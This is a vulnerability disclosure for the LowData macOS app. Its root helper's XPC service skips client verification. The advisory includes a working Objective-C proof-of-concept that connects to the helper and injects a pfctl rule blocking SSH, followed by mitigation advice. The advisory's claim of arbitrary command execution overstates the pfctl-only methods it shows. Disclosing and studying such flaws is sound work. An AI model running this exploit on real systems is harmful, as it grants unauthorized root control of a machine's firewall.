## Summary

A local privilege escalation vulnerability exists in the `LowData` macOS application. The app includes a privileged helper tool that exposes a Mach XPC service (`com.lowdata.helper`) without proper authentication of connecting clients. This allows any local user to execute root-level commands, including packet filter (`pfctl`) operations.

## Technical Details

The helper tool is launched with root privileges and uses `NSXPCListener` to expose the `LowDataHelperProtocol` interface. However, the connection verification function is stubbed as follows:

```swift
private func verifyConnection(_ connection: NSXPCConnection) -> Bool {
    // TODO: Implement proper code signing verification
    return true
}
```

This effectively allows **any local process** to connect to the helper and call privileged methods, including:

- `applyBlockingRules(...)`: which writes to `/tmp/lowdata_rules.conf` and executes:

  ```sh
  /sbin/pfctl -f /tmp/lowdata_rules.conf -e
  ```

- `removeAllBlockingRules(...)`: which runs:

  ```sh
  /sbin/pfctl -F rules
  ```

This results in **arbitrary root command execution** through the helper.

## Exploit script

proof-of-concept. The exploit connects to the helper and injects a firewall rule blocking outbound SSH (port 22), demonstrating full privileged control.

```objective-c
// Exploit.m
// Compile with: clang -framework Foundation Exploit.m -o exploit

#import <Foundation/Foundation.h>

// Define the protocol as an Objective-C protocol
@protocol LowDataHelperProtocol
- (void)applyBlockingRules:(NSArray *)rules reply:(void (^)(BOOL success, NSString *error))reply;
@end

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSLog(@"starting LowData privilege escalation PoC...");

        NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.lowdata.helper" options:0];
        connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(LowDataHelperProtocol)];
        [connection resume];

        id<LowDataHelperProtocol> proxy = [connection remoteObjectProxyWithErrorHandler:^(NSError * _Nonnull error) {
            NSLog(@"failed to connect: %@", error);
            exit(1);
        }];

        // Create a malicious pfctl rule that blocks outbound SSH
        NSArray *maliciousRules = @[
            @{@"type": @"port", @"port": @22, @"protocol": @"tcp"}
        ];

        [proxy applyBlockingRules:maliciousRules reply:^(BOOL success, NSString *error) {
            if (success) {
                NSLog(@"exploit succeeded: root pfctl rule injected.");
            } else {
                NSLog(@"exploit failed: %@", error);
            }
            exit(0);
        }];

        [[NSRunLoop currentRunLoop] run]; // Keep process alive to receive reply
    }
}
```

## Impact
Any local user can execute privileged firewall commands as root without authentication. This allows blocking system traffic, disabling rules, or injecting malicious configurations.

## Mitigation

To prevent unprivileged access, the helper should enforce proper client validation using one or more of the following:

- Code signature validation (via `SecCodeCopyGuestWithAttributes` and `SecCodeCheckValidity`)
- Entitlement checks
- Restricting access to specific user or group
- Dropping `NSXPCListener` in favor of SMAppService with proper authorization model

## Affected Version

GitHub source code as of commit `f9c99549d54c5940686b522eefbe53fad0571728` (September 13, 2025)

```sh
commit f9c99549d54c5940686b522eefbe53fad0571728 (HEAD -> main, origin/main, origin/HEAD)
Author: Konrad Michels <konrad@tonalphoto.com>
Date:   Wed Sep 3 10:47:29 2025 -0400
```

*(No official releases were published at time of disclosure)*

Repository: https://github.com/kmichels/LowData



